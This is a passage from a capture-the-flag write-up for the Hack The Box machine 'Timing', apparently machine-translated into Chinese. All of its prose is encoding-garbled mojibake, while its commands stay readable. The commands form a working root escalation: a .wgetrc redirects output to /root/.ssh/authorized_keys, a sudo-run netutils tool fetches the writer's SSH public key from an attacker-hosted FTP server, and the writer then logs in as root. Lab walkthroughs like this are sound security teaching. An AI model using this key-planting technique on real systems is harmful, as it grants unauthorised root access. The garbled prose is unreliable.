kl" href="https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Commands.html" rel="noopener ugc nofollow" target="_blank">è¿™é‡Œ</a>æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªé€‰é¡¹å¯ä»¥è®¾ç½®æ£€ç´¢æ–‡ä»¶çš„åç§°å’Œè·¯å¾„ã€‚æˆ‘ä»¬å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œjavaåº”ç”¨ç¨‹åºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†/rootä½œä¸ºå¯å†™ä½ç½®è¿›è¡Œè®¿é—®ã€‚è®©æˆ‘ä»¬æŠŠKaliå…¬å…±SSHå¯†é’¥æ”¾åœ¨é‚£é‡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•ï¼Œä¸éœ€è¦å¯†ç ã€‚</p><p id="caf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">é¦–å…ˆåˆ›å»ºã€‚/home/aaronä¸­çš„wgetrcé…ç½®æ–‡ä»¶:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="042b" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ cat &lt;&lt;_EOF_&gt;.wgetrc<br/>&gt; output_document = /root/.ssh/authorized_keys<br/>&gt; _EOF_</span></pre><p id="cc61" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœéœ€è¦ï¼Œåœ¨Kaliä¸Šåˆ›å»ºæˆ‘ä»¬çš„SSHå¯†é’¥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="dd35" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# ssh-keygen          <br/>Generating public/private rsa key pair.<br/>Enter file in which to save the key (/root/.ssh/id_rsa): <br/>Enter passphrase (empty for no passphrase): <br/>Enter same passphrase again: <br/>Your identification has been saved in /root/.ssh/id_rsa<br/>Your public key has been saved in /root/.ssh/id_rsa.pub<br/>The key fingerprint is:<br/>SHA256:B/SsKx8Z8AU/c40jKybaq8OpWpTVdl2Yz0e/ktMxXxY root@kali<br/>The key's randomart image is:<br/>+---[RSA 3072]----+<br/>|        o  o.    |<br/>|     . . *o. o.E |<br/>|    . + o Xo+....|<br/>|   o . + + *o..o+|<br/>|  o   . S o  .o.*|<br/>| .   o o *   + o.|<br/>|  ....o +     o  |<br/>| .  +  + .       |<br/>|.....o. .        |<br/>+----[SHA256]-----+</span></pre><p id="0ed6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å°†å…¬é’¥çš„å‰¯æœ¬æ”¾åœ¨æˆ‘ä»¬çš„å·¥ä½œæ–‡ä»¶å¤¹ä¸­:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="fe14" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# cp .ssh/id_rsa.pub htb/timing</span></pre><h1 id="a9e1" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">Python FTPæœåŠ¡å™¨</h1><p id="545a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">å¦‚æœéœ€è¦ï¼Œå®‰è£…Python3 FTPåº“:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/9ec224c8f9dfd5db49bfb8f2a7678ee2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2PteNGaxYJWli2i0CdlScg.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">å®‰è£…pyftpdlib</figcaption></figure><p id="66d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å¯åŠ¨ä¸€ä¸ªFTPæœåŠ¡å™¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è·å¾—æˆ‘ä»¬çš„SSHå…¬é’¥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="255a" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# python3 -m pyftpdlib -p 21<br/>[I 2021-12-29 22:15:26] concurrency model: async<br/>[I 2021-12-29 22:15:26] masquerade (NAT) address: None<br/>[I 2021-12-29 22:15:26] passive ports: None<br/>[I 2021-12-29 22:15:26] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=1597 &lt;&lt;&lt;</span></pre><p id="6871" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢å›ç›’å­ï¼Œå†æ¬¡è¿è¡Œnetutilsåº”ç”¨ç¨‹åºï¼Œè¿™æ¬¡ä¸ºFTPé€‰æ‹©0ï¼Œå¹¶è¾“å…¥æˆ‘ä»¬çš„Kali IPå’Œæˆ‘ä»¬æ‰˜ç®¡åœ¨é‚£é‡Œçš„SSHå…¬é’¥:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="09f7" class="mu kn iq mq b gy mv mw l mx my">aaron@timing:~$ sudo /usr/bin/netutils<br/>netutils v0.1<br/>Select one option:<br/>[0] FTP<br/>[1] HTTP<br/>[2] Quit<br/>Input &gt;&gt; 0<br/>Enter Url+File: 10.10.14.12/id_rsa.pub</span></pre><p id="b452" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨å›åˆ°å¡åˆ©ï¼Œæ£€æŸ¥æ–‡ä»¶è¢«è¦æ±‚:</p><figure class="ll lm ln lo gt lp gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nn"><img src="../Images/42435da6074fe85bf333e49deb30b307.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RU6AfT34n48qT3qUp0A68A.png"/></div></div><figcaption class="ls lt gj gh gi lu lv bd b be z dk translated">Kaliä¸Šè¿è¡Œçš„FTPæœåŠ¡å™¨</figcaption></figure><h1 id="1292" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">SSHä½œä¸ºRootç”¨æˆ·</h1><p id="d9e0" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">æ˜¯çš„ï¼Œæ‰€ä»¥å¯åŠ¨ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œä»¥rootç”¨æˆ·èº«ä»½ç™»å½•åˆ°æœºå™¨:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="ee64" class="mu kn iq mq b gy mv mw l mx my">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/timing]<br/>â””â”€# ssh root@timing.htb  <br/>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)<br/>Last login: Tue Dec  7 12:08:29 2021<br/>root@timing:~#</span></pre><p id="930b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŠ“ä½æ——å­ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†:</p><pre class="ll lm ln lo gt mp mq mr ms aw mt bi"><span id="c0df" class="mu kn iq mq b gy mv mw l mx my">root@timing:~# cat /root/root.txt <br/>&lt;HIDDEN&gt;</span></pre><p id="8fcf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆä¸€ä¸ªç›’å­å®Œæˆäº†ã€‚æˆ‘çœŸçš„å¾ˆå–œæ¬¢è¿™ä¸ªï¼Œå› ä¸ºå®ƒéœ€è¦ç›¸å½“å¤šçš„æ€è€ƒæ‰èƒ½å®Œæˆã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl no np hu nq" role="separator"><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt nu"/><span class="nr bw bk ns nt"/></div><div class="ij ik il im in"><p id="9159" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°(è¿™æ˜¯å…è´¹çš„ï¼)</p><p id="cd4d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae kl" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae kl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="9a2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nv">åŸè½½äº2022å¹´6æœˆ3æ—¥</em><a class="ae kl" href="https://pencer.io/ctf/ctf-htb-timing" rel="noopener ugc nofollow" target="_blank"><em class="nv">https://pencer . io</em></a><em class="nv">ã€‚</em></p></div></div>    
</body>
</html>